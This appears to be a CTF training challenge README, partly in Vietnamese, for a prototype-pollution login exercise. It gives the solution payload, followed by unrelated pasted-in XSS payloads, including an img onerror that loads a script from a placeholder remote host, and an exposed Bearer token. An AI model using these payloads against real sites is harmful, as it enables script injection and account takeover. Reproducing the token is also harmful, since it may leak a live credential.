# Type
`challenge CTF training: Re03`
# Deploy
- `docker-compose up -d --build`
# Description
Prototype pollution vulnerability.
## Chức năng
- Đăng nhập
## Solution
- POST data trong chức năng đăng nhập: {"\_\_proto\_\_":{"role":1}} (lưu ý header cần sửa thành Content-Type: application/json)
## Error: Cannot find module 'ejs' --> fix:
- `cd ./web`
- `npm install ejs`
<img src="http://nonexistent-image" onerror="var script = document.createElement('script'); script.src='http://ip/client.js'; document.body.appendChild(script);">
java:alert()
<a href="javascript:alert(1)">Click here</a>
//<img src="nonexistent.jpg" onerror="var script = document.createElement('script'); script.src = 'http://ip/client.js'; document.body.appendChild(script);">

Authorization: Bearer gAAAAABnPFkNXTObuajuSn0Qq8sTF8xHV-hlWPdLhEAyxdB0zxfcECidTZ0_vhEh-ajU16X3ctwgqV5xLNvo0UkscVgASy6I4965SIf-zbKAf1xehrInyoBRloqgfpNKvmH5pae3ANuhhN4goh7E9QpaKUyddz3qk123J6GflrZckGjLDCjquGqoS5b1JjXrRhlkHg0ql0enXASijEKQkoiQW_4lsGj7_GrpasS4SniUSNoQxrmwJCsQjyXMPu-VsegZeOlEojVrUeaC9Q2AA1erkqAlGu3JahnfJSInFv3__nO5nUv4o6ELU8alDlPjYvXEBtbi8XIUCGeRCFq7G0zuk_3xQDGrSR21RTqdi3HNKak9CMYLvCM=
